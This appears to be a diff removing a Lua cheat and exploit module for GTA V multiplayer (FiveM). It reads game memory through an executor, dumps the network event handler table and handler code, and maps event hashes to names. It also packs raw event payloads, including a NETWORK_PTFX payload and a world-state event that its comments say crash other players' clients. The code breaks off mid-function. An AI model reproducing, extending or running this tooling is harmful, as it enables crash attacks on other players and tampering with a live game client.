-        if not okg or type(g) ~= "number" or g == 0 then
-            return nil, "gta-net-five not loaded"
-        end
-        local delta = read_u64(g + REG_GTA_DELTA) or 0
-        local gbase = delta + 0x140000000
-        local r0 = read_u64(g + REG_BASE_PTR) or 0
-        local r1 = 0
-        if r0 > 0x10000 then r1 = read_u64(r0) or 0 end
-
-        local best, bestHits = nil, -1
-        local cands = { r0, r1 }
-        for ci = 1, 2 do
-            local t = cands[ci]
-            if t > 0x10000 then
-                for oi = 1, #REG_OFFSETS do
-                    local hits = 0
-                    for i = 0, 89 do
-                        local fn = read_u64(t + REG_OFFSETS[oi] + i * 8)
-                        if in_gta(fn, gbase) then hits = hits + 1 end
-                    end
-                    if hits > bestHits then
-                        bestHits = hits
-                        best = { ptr = t, off = REG_OFFSETS[oi] }
-                    end
-                end
-            end
-        end
-        if not best or bestHits < 45 then return nil, "table not found" end
-
-        local vb = read_u64(g + REG_HASH_VEC) or 0
-        local ve = read_u64(g + REG_HASH_VEC + 8) or 0
-        local n = 0
-        if vb > 0x10000 and ve > vb then n = math.floor((ve - vb) / 4) end
-        if n < 1 or n > 4096 then return nil, "hash vector empty (send one event first)" end
-
-        return {
-            m = m, g = g, gbase = gbase, tbl = best.ptr, off = best.off,
-            n = n, vb = vb, root = r0, single = r1,
-        }
-    end
-
-    function NET.regDump()
-        local t, err = NET.regTable()
-        if not t then O.log("net reg: %s", tostring(err)); return false end
-        local lines = {
-            string.format("g=0x%X gbase=0x%X tbl=0x%X off=0x%X n=%d",
-                          t.g, t.gbase, t.tbl, t.off, t.n),
-        }
-        local okRows = 0
-        for i = 0, t.n - 1 do
-            local hash = read_u32(t.vb + i * 4) or 0
-            local fn = read_u64(t.tbl + t.off + i * 8)
-            local rva = 0
-            if in_gta(fn, t.gbase) then rva = fn - t.gbase; okRows = okRows + 1 end
-            lines[#lines + 1] = string.format("%d %08X %X", i, hash, rva)
-        end
-        local txt = table.concat(lines, "\n")
-        pcall(function() return Susano.WriteFile("netreg.ssn", txt) end)
-        if Susano and type(Susano.CopyToClipboard) == "function" then
-            pcall(Susano.CopyToClipboard, txt)
-        end
-        O.log("net reg: %d events, %d resolved -> netreg.ssn", t.n, okRows)
-        return true
-    end
-
-    -- =====================================================================
-    -- Dispatcher census
-    -- =====================================================================
-    -- gta-net-five!sub_18008DD60 resolves the handler from the wire hash, not
-    -- from the wire id:
-    --
-    --   node = map_lookup_by_u32(qword_1802045E8, eventNameHash);
-    --   v32  = *(u64*)qword_1802043C0;
-    --   v35  = *(u64*)(v32 + OFF + 8 * *(u16*)(node + 20));   // OFF 0x3B3D0
-    --   if (v35 && v35 >= gbase && v35 < gbase + 0x6000000)
-    --       v35(&bitstream, sender, mgr, packet_eventId, 0, 0);
-    --
-    -- Two consequences, both load-bearing:
-    --   * the index is the id the game registered with that hash, so the wire
-    --     eventId cannot steer the table - only a registered (hash, id) pair
-    --     dispatches, which is the 91 pairs netreg.ssn already lists;
-    --   * the wire eventId is still forwarded to the handler, so the same
-    --     registered event runs with whatever id we put on the wire.
-    -- The census confirms the array's real extent and how many ids past the
-    -- registry are live, which is what tells us whether the table is exactly
-    -- 91 slots or a larger preallocated block.
-    local IDSCAN_BLOCK = 512          -- slots per ReadBytes call (4 KiB)
-
-    local function bytes_to_u64(b, i)
-        local v, mul = 0, 1
-        for k = 0, 7 do
-            local byte = b[i + k]
-            if type(byte) ~= "number" then return 0 end
-            v = v + (byte % 256) * mul
-            mul = mul * 256
-        end
-        return v
-    end
-
-    function NET.tblCensus(n)
-        n = math.floor(tonumber(n) or 2048)
-        if n < 8 then n = 8 end
-        if n > 8192 then n = 8192 end
-        local t, err = NET.regTable()
-        if not t then O.log("net tbl: %s", tostring(err)); return false end
-        local m = t.m
-        if type(m.ReadBytes) ~= "function" then return false end
-        local lines = {
-            string.format("gbase=0x%X tbl=0x%X off=0x%X n=%d", t.gbase, t.tbl, t.off, t.n),
-        }
-        local id, live, inWin = 0, 0, 0
-        while id < n do
-            local count = math.min(IDSCAN_BLOCK, n - id)
-            local ok, buf = pcall(m.ReadBytes, t.tbl + t.off + id * 8, count * 8)
-            if ok and type(buf) == "table" then
-                local avail = math.min(count, math.floor(#buf / 8))
-                for k = 0, avail - 1 do
-                    local fn = bytes_to_u64(buf, k * 8 + 1)
-                    local rva = 0
-                    if fn ~= 0 then
-                        live = live + 1
-                        if fn >= t.gbase and fn < t.gbase + 0x6000000 then
-                            rva = fn - t.gbase
-                            inWin = inWin + 1
-                        end
-                    end
-                    lines[#lines + 1] = string.format("%d %X", id + k, rva)
-                end
-            end
-            id = id + count
-        end
-        pcall(function() return Susano.WriteFile("nettbl.ssn", table.concat(lines, "\n")) end)
-        O.log("net tbl: %d slots, %d live qwords, %d in-window -> nettbl.ssn",
-              n, live, inWin)
-        return true
-    end
-
-    -- Low-level: send one registered event with an explicit payload. `hash`
-    -- must be a registered name hash; `eventId` is copied to the receiver and
-    -- reaches the handler as its 4th argument.
-    function NET.oob(eventId, hash, ids, data)
-        eventId = math.floor(tonumber(eventId) or -1)
-        if eventId < 0 or eventId > 65535 then return false end
-        if type(ids) ~= "table" or #ids == 0 then return false end
-        return NET.emitEvent(ids, tonumber(hash) or 0xC00B8EB5, eventId, data or {})
-    end
-
-    -- Event payload packer.
-    --
-    -- The receiver hands the data bytes straight to datBitBuffer and every
-    -- field reader pulls the next N bits out of that buffer most significant
-    -- bit first, so the payload is produced the same way. A field is either
-    --     { bits = 8,  val = 3 }            -- scalar, needs |val| < 2^53
-    --     { bits = 64, val = {b1 .. b8} }   -- full width, little-endian bytes
-    -- and the final byte is zero padded, which matches the reader's 8*len bit
-    -- budget. `lsbFirst` flips the intra-field order for the readers that are
-    -- little-endian; default is the datBitBuffer order.
-    function NET.bits(spec, lsbFirst)
-        if type(spec) ~= "table" then return nil end
-        local out, acc, nacc = {}, 0, 0
-        local function bit_of(field, i)
-            local v = field.val
-            if type(v) == "table" then
-                local byte = math.floor(i / 8) + 1
-                local value = tonumber(v[byte]) or 0
-                return math.floor(value / (2 ^ (i % 8))) % 2
-            end
-            return math.floor((tonumber(v) or 0) / (2 ^ i)) % 2
-        end
-        for fi = 1, #spec do
-            local field = spec[fi]
-            local n = math.floor(tonumber(field.bits) or 0)
-            if n > 0 and n <= 64 then
-                for k = 0, n - 1 do
-                    local idx = lsbFirst and k or (n - 1 - k)
-                    acc = acc * 2 + bit_of(field, idx)
-                    nacc = nacc + 1
-                    if nacc == 8 then
-                        out[#out + 1] = acc % 256
-                        acc, nacc = 0, 0
-                    end
-                end
-            end
-        end
-        if nacc > 0 then
-            out[#out + 1] = (acc * (2 ^ (8 - nacc))) % 256
-        end
-        return out
-    end
-
-    function NET.fire(eventId, hash, ids, spec, lsbFirst)
-        local data = NET.bits(spec, lsbFirst)
-        if not data then return false end
-        return NET.oob(eventId, hash, ids, data)
-    end
-
-    -- Name hash per wire id, straight out of netreg.ssn (build 3751). The
-    -- dispatcher resolves the handler from the hash but forwards the id to the
-    -- handler, so a payload needs both and they must belong together. Ids 9,
-    -- 10 and 87..90 are registered with no handler (hash B16BF81F, fn 0).
-    NET.EV = {
-        [0] = 0x9CFF54F6, 0xE2353810, 0xAAB41E6F, 0x672C540D, 0x6C7ED2E7,
-        0x28FB6CD3, 0xA3CE52FD, 0xE173176D, 0xEA23DEF4, 0xB16BF81F,
-        0xB16BF81F, 0xBD1355C7, 0xF4A0EF99, 0xF9214D84, 0x96409610,
-        0x2AC5BF6D, 0xEB59AF4A, 0xFA3ABE0E, 0xC2BCC349, 0x9576B0A3,
-        0xC3B0BDDB, 0x661C8571, 0x9CF8A204, 0xD525AAFF, 0x37C7FB68,
-        0x5BA4ED9D, 0xA6CCCD6A, 0x9832C9FA, 0xCDE489F2, 0x0516053F,
-        0x629BBB0A, 0xB616D7C7, 0x4A05BE33, 0xC00B8EB5, 0xF221BAEF,
-        0x82F5F0FF, 0x7FAD02DC, 0x5FA50E3D, 0x3F662691, 0x84079E73,
-        0xEFB69338, 0xB6E8D2A3, 0xDF555EBF, 0x18C850B0, 0x20E73685,
-        0x3192DF2D, 0xAED6EF90, 0x5921BCE3, 0x5037EA89, 0x716DF948,
-        0x5C239542, 0xF0CE74EE, 0xCC87BC28, 0x9D579F2A, 0x5B356FC8,
-        0x86146EF7, 0x39DAF249, 0x74FA708E, 0x3C0AF3A4, 0xD6B974C7,
-        0x91016504, 0xACA11BB2, 0x884B69CA, 0xDE5B353A, 0xDC94C828,
-        0x4591A6B8, 0xEC406753, 0x9E36A2FF, 0xAC37297C, 0x0F48FB40,
-        0x2FFB857E, 0x3A48A28D, 0x40366FE1, 0x5475252E, 0xABD06449,
-        0x0A8C49B2, 0xC1286D5E, 0x92B0F3DA, 0x7A03C5A6, 0x694F498B,
-        0xD8BE5236, 0x2A7695D3, 0x9EE76D23, 0x5E70685A, 0x4FB72690,
-        0x76C0048E, 0x2418A98E, 0xB16BF81F, 0xB16BF81F, 0xB16BF81F,
-        0xB16BF81F,
-    }
-
-    -- Event names, recovered by hashing every upper-case token in GTA5.exe
-    -- against the registry in netreg.ssn. 85 of the 91 slots resolve; 9, 10 and
-    -- 87..90 share one hash and are registered with no handler at all.
-    NET.NAMES = {
-        [0] = "OBJECT_ID_FREED_EVENT",
-        [1] = "OBJECT_ID_REQUEST_EVENT",
-        [2] = "ARRAY_DATA_VERIFY_EVENT",
-        [3] = "SCRIPT_ARRAY_DATA_VERIFY_EVENT",
-        [4] = "REQUEST_CONTROL_EVENT",
-        [5] = "GIVE_CONTROL_EVENT",
-        [6] = "WEAPON_DAMAGE_EVENT",
-        [7] = "REQUEST_PICKUP_EVENT",
-        [8] = "REQUEST_MAP_PICKUP_EVENT",
-        [11] = "RESPAWN_PLAYER_PED_EVENT",
-        [12] = "GIVE_WEAPON_EVENT",
-        [13] = "REMOVE_WEAPON_EVENT",
-        [14] = "REMOVE_ALL_WEAPONS_EVENT",
-        [15] = "VEHICLE_COMPONENT_CONTROL_EVENT",
-        [16] = "FIRE_EVENT",
-        [17] = "EXPLOSION_EVENT",
-        [18] = "START_PROJECTILE_EVENT",
-        [19] = "UPDATE_PROJECTILE_TARGET_EVENT",
-        [20] = "REMOVE_PROJECTILE_ENTITY_EVENT",
-        [21] = "BREAK_PROJECTILE_TARGET_LOCK_EVENT",
-        [22] = "ALTER_WANTED_LEVEL_EVENT",
-        [23] = "CHANGE_RADIO_STATION_EVENT",
-        [24] = "RAGDOLL_REQUEST_EVENT",
-        [25] = "PLAYER_TAUNT_EVENT",
-        [26] = "PLAYER_CARD_STAT_EVENT",
-        [27] = "DOOR_BREAK_EVENT",
-        [28] = "SCRIPTED_GAME_EVENT",
-        [29] = "REMOTE_SCRIPT_INFO_EVENT",
-        [30] = "REMOTE_SCRIPT_LEAVE_EVENT",
-        [31] = "MARK_AS_NO_LONGER_NEEDED_EVENT",
-        [32] = "CONVERT_TO_SCRIPT_ENTITY_EVENT",
-        [33] = "SCRIPT_WORLD_STATE_EVENT",
-        [34] = "CLEAR_AREA_EVENT",
-        [35] = "CLEAR_RECTANGLE_AREA_EVENT",
-        [36] = "NETWORK_REQUEST_SYNCED_SCENE_EVENT",
-        [37] = "NETWORK_START_SYNCED_SCENE_EVENT",
-        [38] = "NETWORK_STOP_SYNCED_SCENE_EVENT",
-        [39] = "NETWORK_UPDATE_SYNCED_SCENE_EVENT",
-        [40] = "INCIDENT_ENTITY_EVENT",
-        [41] = "GIVE_PED_SCRIPTED_TASK_EVENT",
-        [42] = "GIVE_PED_SEQUENCE_TASK_EVENT",
-        [43] = "NETWORK_CLEAR_PED_TASKS_EVENT",
-        [44] = "NETWORK_START_PED_ARREST_EVENT",
-        [45] = "NETWORK_START_PED_UNCUFF_EVENT",
-        [46] = "NETWORK_SOUND_CAR_HORN_EVENT",
-        [47] = "NETWORK_ENTITY_AREA_STATUS_EVENT",
-        [48] = "NETWORK_GARAGE_OCCUPIED_STATUS_EVENT",
-        [49] = "PED_CONVERSATION_LINE_EVENT",
-        [50] = "SCRIPT_ENTITY_STATE_CHANGE_EVENT",
-        [51] = "NETWORK_PLAY_SOUND_EVENT",
-        [52] = "NETWORK_STOP_SOUND_EVENT",
-        [53] = "NETWORK_PLAY_AIRDEFENSE_FIRE_EVENT",
-        [54] = "NETWORK_BANK_REQUEST_EVENT",
-        [55] = "NETWORK_AUDIO_BARK_EVENT",
-        [56] = "REQUEST_DOOR_EVENT",
-        [57] = "NETWORK_TRAIN_REPORT_EVENT",
-        [58] = "NETWORK_TRAIN_REQUEST_EVENT",
-        [59] = "NETWORK_INCREMENT_STAT_EVENT",
-        [60] = "MODIFY_VEHICLE_LOCK_WORD_STATE_DATA",
-        [61] = "MODIFY_PTFX_WORD_STATE_DATA_SCRIPTED_EVOLVE_EVENT",
-        [62] = "REQUEST_PHONE_EXPLOSION_EVENT",
-        [63] = "REQUEST_DETACHMENT_EVENT",
-        [64] = "KICK_VOTES_EVENT",
-        [65] = "GIVE_PICKUP_REWARDS_EVENT",
-        [66] = "BLOW_UP_VEHICLE_EVENT",
-        [67] = "NETWORK_SPECIAL_FIRE_EQUIPPED_WEAPON",
-        [68] = "NETWORK_RESPONDED_TO_THREAT_EVENT",
-        [69] = "NETWORK_SHOUT_TARGET_POSITION",
-        [70] = "VOICE_DRIVEN_MOUTH_MOVEMENT_FINISHED_EVENT",
-        [71] = "PICKUP_DESTROYED_EVENT",
-        [72] = "UPDATE_PLAYER_SCARS_EVENT",
-        [73] = "NETWORK_CHECK_EXE_SIZE_EVENT",
-        [74] = "NETWORK_PTFX_EVENT",
-        [75] = "NETWORK_PED_SEEN_DEAD_PED_EVENT",
-        [76] = "REMOVE_STICKY_BOMB_EVENT",
-        [77] = "NETWORK_CHECK_CODE_CRCS_EVENT",
-        [78] = "INFORM_SILENCED_GUNSHOT_EVENT",
-        [79] = "PED_PLAY_PAIN_EVENT",
-        [80] = "CACHE_PLAYER_HEAD_BLEND_DATA_EVENT",
-        [81] = "REMOVE_PED_FROM_PEDGROUP_EVENT",
-        [82] = "REPORT_MYSELF_EVENT",
-        [83] = "REPORT_CASH_SPAWN_EVENT",
-        [84] = "ACTIVATE_VEHICLE_SPECIAL_ABILITY_EVENT",
-        [85] = "BLOCK_WEAPON_SELECTION",
-        [86] = "NETWORK_CHECK_CATALOG_CRC",
-    }
-
-    -- NETWORK_PTFX (id 74), decoded field by field from its Read at 0x116AFD0:
-    --
-    --   32 hashA -> +0x54      32 hashB -> +0x58
-    --   19 enumA -> +0x30      19 enumB -> +0x40
-    --   10 -> +0x60  (scaled float)
-    --    3 -> +0x68
-    --    1, if 1 then 13 -> +0x50
-    --    1, if 1 then 32 -> +0x5c   (through a virtual sub-reader)
-    --    1, if 1 then 8,8,8 -> +0x69..+0x6b
-    --    1, if 1 then 8 -> +0x64    (scaled float)
-    --
-    -- Every conditional field is forced present, so the payload is a fixed
-    -- 140 bits and the receiver never sees a stream that stops mid-field.
-    -- Apply (0x117C3DC) buckets hashB modulo a global table size, walks the
-    -- chain, then hands hashA, both enums, +0x5c, +0x60 and +0x68 to the
-    -- engine's PtFx start (0x17105B8) together with the object resolved from
-    -- the 13-bit id. A hash that names a DLC asset is what forces the
-    -- CExtraContentWrapper::INIT__SESSION path seen in the victim crash.
-    function NET.ptfx(o)
-        o = type(o) == "table" and o or {}
-        return {
-            { bits = 32, val = tonumber(o.hashA) or 0 },
-            { bits = 32, val = tonumber(o.hashB) or 0 },
-            { bits = 19, val = tonumber(o.enumA) or 0 },
-            { bits = 19, val = tonumber(o.enumB) or 0 },
-            { bits = 10, val = tonumber(o.s10) or 0 },
-            { bits = 3,  val = tonumber(o.s3) or 0 },
-            { bits = 1,  val = 1 }, { bits = 13, val = tonumber(o.ptfxId) or 0 },
-            { bits = 1,  val = 1 }, { bits = 32, val = tonumber(o.ext) or 0 },
-            { bits = 1,  val = 1 },
-            { bits = 8,  val = tonumber(o.r) or 255 },
-            { bits = 8,  val = tonumber(o.g) or 255 },
-            { bits = 8,  val = tonumber(o.b) or 255 },
-            { bits = 1,  val = 1 }, { bits = 8, val = tonumber(o.s8) or 0 },
-        }
-    end
-
-    -- joaat, the hash the client uses for asset and effect names.
-    --
-    -- Written with arithmetic only: the loader has to parse under whatever Lua
-    -- the executor ships, and a binary `~` would be a syntax error on 5.1 while
-    -- the 5.4-only shift operators are no safer. A 32-bit xor over bit pairs is
-    -- slow in the abstract and irrelevant here: names are 30 chars at most.
-    local function bxor32(a, b)
-        local r, bit = 0, 1
-        for _ = 1, 32 do
-            local x = a % 2
-            local y = b % 2
-            if x ~= y then r = r + bit end
-            a = (a - x) / 2
-            b = (b - y) / 2
-            bit = bit * 2
-        end
-        return r
-    end
-
-    local M32 = 4294967296
-
-    function NET.joaat(text)
-        local h = 0
-        text = tostring(text or "")
-        for i = 1, #text do
-            h = (h + text:byte(i)) % M32
-            h = (h + (h * 1024) % M32) % M32
-            h = bxor32(h, math.floor(h / 64))
-        end
-        h = (h + (h * 8) % M32) % M32
-        h = bxor32(h, math.floor(h / 2048))
-        h = (h + (h * 32768) % M32) % M32
-        return h
-    end
-
-    -- Arbitrary read, so a global table can be measured before and after a
-    -- payload instead of guessed at. `rva` is relative to the GTA5.exe image
-    -- base, the coordinate system every address in this file is written in.
-    -- Susano does not expose GTA5.exe through Memory.Module on this build, so
-    -- the base is derived the same way the registry code already does it:
-    -- gta-net-five.dll holds the image delta, base = delta + 0x140000000. That
-    -- path is proven (netreg resolves 85 handlers with it). Memory.Module and
-    -- GetModuleBase stay as fallbacks for builds that do expose the name.
-    local cachedBase = nil
-    local function gta_base()
-        if cachedBase then return cachedBase end
-        local m = mem()
-        if not m then return nil end
-        if type(m.Module) == "function" then
-            local ok, g = pcall(m.Module, "gta-net-five.dll")
-            if ok and type(g) == "number" and g > 0x10000 then
-                local delta = read_u64(g + REG_GTA_DELTA)
-                -- The image is genuinely ASLR'd: netreg.ssn reports
-                -- gbase = 0x7FF686B40000, so delta is 0x7EB286B40000, not a
-                -- small number. The earlier `delta < 0x20000000` bound was
-                -- wrong and rejected the only good answer 19 times. Bound the
-                -- *result* instead: a user-mode image base lives in the same
-                -- band as the module handles, well above 4 GiB.
-                if type(delta) == "number" then
-                    local base = delta + 0x140000000
-                    if base > 0x100000000 and base < 0x7FFFFFFF0000 then
-                        cachedBase = base
-                        return cachedBase
-                    end
-                end
-            end
-        end
-        local t = NET.regTable()
-        if t and type(t.gbase) == "number" and t.gbase > 0x10000 then
-            cachedBase = t.gbase
-            return cachedBase
-        end
-        for _, name in ipairs({ "GTA5.exe", "GTA5" }) do
-            if type(m.Module) == "function" then
-                local ok, base = pcall(m.Module, name)
-                if ok and type(base) == "number" and base > 0x10000 then
-                    cachedBase = base
-                    return cachedBase
-                end
-            end
-            if type(m.GetModuleBase) == "function" then
-                local ok, base = pcall(m.GetModuleBase, name)
-                if ok and type(base) == "number" and base > 0x10000 then
-                    cachedBase = base
-                    return cachedBase
-                end
-            end
-        end
-        return nil
-    end
-
-    function NET.rdump(name, addr, len)
-        local m = mem()
-        if not m or type(m.ReadBytes) ~= "function" then return false end
-        addr = math.floor(tonumber(addr) or 0)
-        len = math.floor(tonumber(len) or 0)
-        if addr < 0x10000 or len < 1 or len > 65536 then return false end
-        local ok, bytes = pcall(m.ReadBytes, addr, len)
-        if not ok or type(bytes) ~= "table" then return false end
-        local lines = { string.format("%X %d", addr, #bytes) }
-        local chunk = {}
-        for i = 1, #bytes do
-            chunk[#chunk + 1] = string.format("%02X", (bytes[i] or 0) % 256)
-            if #chunk == 32 then
-                lines[#lines + 1] = table.concat(chunk)
-                chunk = {}
-            end
-        end
-        if #chunk > 0 then lines[#lines + 1] = table.concat(chunk) end
-        local file = string.format("%s.ssn", tostring(name or "rnd"))
-        pcall(function() return Susano.WriteFile(file, table.concat(lines, "\n")) end)
-        O.log("net read: %d bytes @ %X -> %s", #bytes, addr, file)
-        return true
-    end
-
-    function NET.rdumpRva(name, rva, len)
-        local base = gta_base()
-        if not base then O.log("net read: GTA5.exe base unavailable"); return false end
-        return NET.rdump(name, base + math.floor(tonumber(rva) or 0), len)
-    end
-
-    -- The whole world-state chain in one click.
-    --
-    -- The 9 type factories live in a table at 0x2A2BC60, but that RVA is past
-    -- the .data raw size (0x1D1A000 + 0x19A000 = 0x1EB4000), so it is zero on
-    -- disk and filled at startup: only the live process has it. Each factory
-    -- opens with `lea rX,[rip+vtable]`, which yields the class vtable, and the
-    -- vtable slot +0x78 is the payload deserializer that 0x116BBFC calls as
-    -- soon as a SCRIPT_WORLD_STATE_EVENT arrives. Resolving factory -> vtable
-    -- -> deserializer here turns three separate dump rounds into one, and it
-    -- lands exactly on the code that parses an attacker payload.
-    local WS_TABLE_RVA = 0x2A2BC60
-    local WS_TYPES = 9
-    local WS_SLOT_READ = 0x78
-
-    local function le_i32(bytes, i)
-        local v = 0
-        for k = 0, 3 do
-            local byte = bytes[i + k]
-            if type(byte) ~= "number" then return nil end
-            v = v + (byte % 256) * (2 ^ (8 * k))
-        end
-        if v >= 0x80000000 then v = v - 0x100000000 end
-        return v
-    end
-
-    local function hex_line(bytes)
-        local t = {}
-        for i = 1, #bytes do
-            t[#t + 1] = string.format("%02X", (bytes[i] or 0) % 256)
-        end
-        return table.concat(t)
-    end
-
-    -- `lea rX,[rip+disp32]` is 48 8D /r with modrm.mod = 00 and rm = 101.
-    local function first_rip_lea(bytes, origin)
-        local last = math.min(#bytes, 0x60) - 6
-        for p = 1, last do
-            if bytes[p] == 0x48 and bytes[p + 1] == 0x8D then
-                local modrm = bytes[p + 2]
-                if modrm == 0x05 or modrm == 0x0D or modrm == 0x15 or modrm == 0x1D then
-                    local d = le_i32(bytes, p + 3)
-                    if d then
-                        local target = origin + (p - 1) + 7 + d
-                        if target > 0x10000 then return target end
-                    end
-                end
-            end
-        end
-        return nil
-    end
-
-    function NET.wsTable()
-        local base = gta_base()
-        if not base then O.log("net ws: GTA5.exe base unavailable"); return false end
-        local m = mem()
-        if not m or type(m.ReadBytes) ~= "function" then return false end
-        local lines = { string.format("base=%X table=%X", base, base + WS_TABLE_RVA) }
-        local found = 0
-        for i = 0, WS_TYPES - 1 do
-            local ctor = raw_u64(base + WS_TABLE_RVA + i * 8) or 0
-            if ctor > 0x10000 then
-                found = found + 1
-                local okc, code = pcall(m.ReadBytes, ctor, 0x100)
-                if okc and type(code) == "table" and #code >= 16 then
-                    lines[#lines + 1] = string.format("C %d %X %s", i, ctor - base, hex_line(code))
-                    local vt = first_rip_lea(code, ctor)
-                    if vt then
-                        local deser = raw_u64(vt + WS_SLOT_READ) or 0
-                        lines[#lines + 1] = string.format("V %d %X %X",
-                            i, vt - base, deser > 0x10000 and (deser - base) or 0)
-                        if deser > 0x10000 then
-                            local okd, dc = pcall(m.ReadBytes, deser, 0x200)
-                            if okd and type(dc) == "table" and #dc >= 16 then
-                                lines[#lines + 1] = string.format("R %d %X %s",
-                                    i, deser - base, hex_line(dc))
-                            end
-                        end
-                    end
-                end
-            end
-        end
-        pcall(function() return Susano.WriteFile("netws.ssn", table.concat(lines, "\n")) end)
-        O.log("net ws: %d factories resolved -> netws.ssn", found)
-        return true
-    end
-
-    -- Dump the first bytes of every event handler. The code of GTA5.exe is
-    -- encrypted on disk (only .rdata/.pdata are plaintext), so the only way to
-    -- read a handler is from the live process. Written as hex so the file can
-    -- be reassembled and disassembled offline.
-    function NET.disDump(size, perFile)
-        size = tonumber(size) or 192
-        perFile = tonumber(perFile) or 18
-        if size < 32 or size > 4096 then return false end
-        local t, err = NET.regTable()
-        if not t then O.log("net dis: %s", tostring(err)); return false end
-        local m = t.m
-        if type(m.ReadBytes) ~= "function" then
-            O.log("net dis: ReadBytes unavailable")
-            return false
-        end
-
-        local total = 0
-        local part = 0
-        local lines = {
-            string.format("gbase=0x%X size=%d n=%d tbl=0x%X off=0x%X",
-                          t.gbase, size, t.n, t.tbl, t.off),
-        }
-        local written = 0
-        for i = 0, t.n - 1 do
-            local fn = read_u64(t.tbl + t.off + i * 8)
-            if in_gta(fn, t.gbase) then
-                local okb, bytes = pcall(m.ReadBytes, fn, size)
-                local hex = {}
-                if okb and type(bytes) == "table" then
-                    for k = 1, #bytes do
-                        hex[#hex + 1] = string.format("%02X", (bytes[k] or 0) % 256)
-                    end
-                end
-                lines[#lines + 1] = string.format("%d %X %s", i, fn - t.gbase,
-                                                  table.concat(hex))
-                written = written + 1
-                total = total + 1
-            end
-            if #lines >= perFile then
-                part = part + 1
-                local name = string.format("netdis_%d.ssn", part)
-                pcall(function()
-                    return Susano.WriteFile(name, table.concat(lines, "\n"))
-                end)
-                lines = { string.format("gbase=0x%X size=%d part=%d", t.gbase, size, part) }
-            end
-        end
-        if #lines > 1 then
-            part = part + 1
-            pcall(function()
-                return Susano.WriteFile(string.format("netdis_%d.ssn", part),
-                                        table.concat(lines, "\n"))
-            end)
-        end
-        O.log("net dis: %d handlers x %d bytes in %d files (netdis_*.ssn)",
-              written, size, part)
-
-        -- Second phase: every target called by a handler. The call targets were
-        -- extracted offline with capstone from the 85 handler bodies; this list
-        -- is their union, so one click dumps the whole per-event layer.
-        local ranges = {
-            -- Phase 2: the shared bit/stream readers. Every Read body calls
-            -- one of these and every one of them lives outside the serializer
-            -- block, so this is the only remaining unknown in the deserialize
-            -- path: whether an exhausted stream leaves the destination
-            -- untouched (garbage in the event object) or zeroes it.
-            --   r8  = bit count for the generic readers, r9 = index width for
-            --   the enum/float table readers, 1-bit for 0x1372620.
-            { 0x03000,   0x04000    }, -- 0x3098
-            { 0x0679000, 0x067A000  }, -- 0x679554  scalar, 64-bit variant
-            { 0x06A9000, 0x06AB000  }, -- 0x6AAC40  enum table, 0x6AAE90 float table
-            { 0x0A5F000, 0x0A60000  }, -- 0xA5FD50, 0xA5FBF0
-            { 0x10E6000, 0x10E8000  }, -- 0x10E6E68, 0x10E6ECC
-            { 0x110B000, 0x110C000  }, -- 0x110B6C4 32-bit field, 18 call sites
-            { 0x1372000, 0x1373000  }, -- 0x1372620 1-bit, 0x1372550, 0x1372B78
-            { 0x142C000, 0x142D000  }, -- 0x142C378 generic reader, 71 call sites
-            { 0x1679000, 0x167A000  }, -- 0x16791B8 generic reader, 62 call sites
-            { 0x1188000, 0x1189000  }, -- 0x1188D7C, 0x1188E18, 0x118A040 nested
-
-            -- Phase 2b: the apply-layer callees that receive a raw wire value
-            -- as an argument, so the only way to know whether that value is a
-            -- pointer, an index or an opaque id is to read the callee.
-            { 0x1099000, 0x109B000  }, -- 0x1099960 id 83 arg1, 0x1099770
-            { 0x10A6000, 0x10A8000  }, -- 0x10A6388 world-state factory
-            { 0x10AD000, 0x10B0000  }, -- 0x10ADFD0, 0x10AEAF C explosion helpers
-            { 0x10B7000, 0x10B9000  }, -- 0x10B7AD8 descriptor -> object
-            { 0x1178000, 0x117C000  }, -- world-state / entity-state sub objects.
-                                       -- 0x117A9D8 is the entity-state factory the
-                                       -- id 50 Read calls; the world-state ctors sit
-                                       -- in the same block.
-            { 0x1000,    0x2000     }, -- live .text head: the first .pdata entry
-                                       -- is 0x1068..0x12A0 and the crash lands at
-                                       -- 0x140001010, i.e. inside that page.
-
-            -- Phase 1, already collected but kept last so a fresh profile gets
-            -- a self-contained dump: every per-event vtable slot +0x28 (Write)
-            -- and +0x30 (Read) in 0x118xxxx is a 5-byte `jmp rel32` into this
-            -- block; 75 distinct Read bodies, 72 Write bodies.
-            { 0x1160000, 0x1178000 },
-        }
-        local CHUNK = 512
-        local PER = 20
-        local rpart = 0
-        local rlines = {}
-        local rbytes = 0
-        local function flushRange()
-            if #rlines == 0 then return end
-            rpart = rpart + 1
-            pcall(function()
-                return Susano.WriteFile(string.format("netrx_%d.ssn", rpart),
-                                        table.concat(rlines, "\n"))
-            end)
-            rlines = {}
-        end
-        for ri = 1, #ranges do
-            local from, to = ranges[ri][1], ranges[ri][2]
-            local at = from
-            while at < to do
-                local want = math.min(CHUNK, to - at)
-                local okr, bytes = pcall(m.ReadBytes, t.gbase + at, want)
-                local hex = {}
-                if okr and type(bytes) == "table" then
-                    for k = 1, #bytes do
-                        hex[#hex + 1] = string.format("%02X", (bytes[k] or 0) % 256)
-                    end
-                end
-                rlines[#rlines + 1] = string.format("%X %s", at, table.concat(hex))
-                rbytes = rbytes + want
-                at = at + want
-                if #rlines >= PER then flushRange() end
-            end
-        end
-        flushRange()
-        O.log("net rng: %d bytes in %d files (netrx_*.ssn)", rbytes, rpart)
-        return true
-    end
-
-    -- The visible half: the operator plays the scenario. The server event that
-    -- crashes the receivers is SCRIPT_WORLD_STATE_EVENT, which GTA's own client
-    -- blacklists ("not relevant in onesync") but which the raw msgNetGameEventV2
-    -- packet still routes. This is the emote the report described.
-    function NET.scenarioEmote()
-        local me = PlayerPedId()
-        if type(me) ~= "number" or me == 0 then return false end
-        -- move_crawl ships four clips: onback_bwd, onback_fwd, onfront_bwd,
-        -- onfront_fwd. onfront_fwd is the face-down forward crawl from the
-        -- screenshot. The clipset with the same name makes it persist while
-        -- walking; blendIn is pushed high so it snaps into the pose instead
-        -- of laying down gradually.
-        RequestAnimDict("move_crawl")
-        local t = GetGameTimer() + 2500
-        while not HasAnimDictLoaded("move_crawl") and GetGameTimer() < t do
-            Citizen.Wait(10)
-        end
-        if HasAnimDictLoaded("move_crawl") then
-            pcall(TaskPlayAnim, me, "move_crawl", "onfront_fwd",
-                  8.0, -8.0, -1, 1, 0.0, false, false, false)
-        end
-        RequestAnimSet("move_crawl")
-        local u = GetGameTimer() + 2500
-        while not HasAnimSetLoaded("move_crawl") and GetGameTimer() < u do
-            Citizen.Wait(10)
-        end
-        if HasAnimSetLoaded("move_crawl") then
-            pcall(SetPedMovementClipset, me, "move_crawl", 1.0)
